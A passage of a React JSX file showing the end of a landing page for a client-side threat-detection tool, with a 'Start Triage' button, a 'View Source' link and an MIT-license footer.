            <p style={{ color: 'var(--text-secondary)', marginBottom: 28, fontSize: '0.9rem', lineHeight: 1.65 }}>
              Drop in a ticket body, paste raw text, or upload a DOCX / PDF.<br />
              Full threat report in under 6 ms. Zero bytes uploaded.
            </p>
            <div style={{ display: 'flex', gap: 12, justifyContent: 'center', flexWrap: 'wrap' }}>
              <motion.button
                onClick={() => navigate('/analyze')}
                whileHover={{ scale: 1.04, boxShadow: '0 0 40px rgba(99,102,241,0.45)' }}
                whileTap={{ scale: 0.97 }}
                style={{
                  padding: '13px 32px', background: 'linear-gradient(135deg, #6366f1, #818cf8)',
                  color: '#fff', border: 'none', borderRadius: 10, fontSize: '0.95rem', fontWeight: 700,
                  cursor: 'pointer', fontFamily: 'var(--font-sans)',
                  display: 'inline-flex', alignItems: 'center', gap: 8,
                }}
              >
                <Search size={15} /> Start Triage <ChevronRight size={15} />
              </motion.button>
              <motion.a
                href="https://github.com" target="_blank" rel="noopener noreferrer"
                whileHover={{ scale: 1.03 }} whileTap={{ scale: 0.97 }}
                style={{
                  padding: '13px 24px', background: 'transparent',
                  color: 'var(--text-secondary)', border: '1px solid var(--border-strong)',
                  borderRadius: 10, fontSize: '0.95rem', fontWeight: 600, cursor: 'pointer',
                  fontFamily: 'var(--font-sans)', textDecoration: 'none',
                  display: 'inline-flex', alignItems: 'center', gap: 8,
                }}
              >
                <GitBranch size={15} /> View Source
              </motion.a>
            </div>
          </motion.div>
        </div>
      </section>

      {/* ── Footer ────────────────────────────────────────────────────────── */}
      <footer style={{
        borderTop: '1px solid var(--border)', padding: '24px',
        textAlign: 'center', color: 'var(--text-muted)',
        fontSize: '0.75rem', fontFamily: 'var(--font-mono)', zIndex: 1,
      }}>
        ZeroContext v1.0 · Client-side threat detection · No telemetry · No storage ·{' '}
        <a href="https://github.com" target="_blank" rel="noopener noreferrer"
          style={{ color: 'var(--text-accent)', textDecoration: 'none' }}>
          Open Source
        </a>
        {' · '}
        <a href="https://github.com/LICENSE" target="_blank" rel="noopener noreferrer"
          style={{ color: 'var(--text-muted)', textDecoration: 'none' }}>
          MIT License
        </a>
      </footer>
    </div>
  )
}
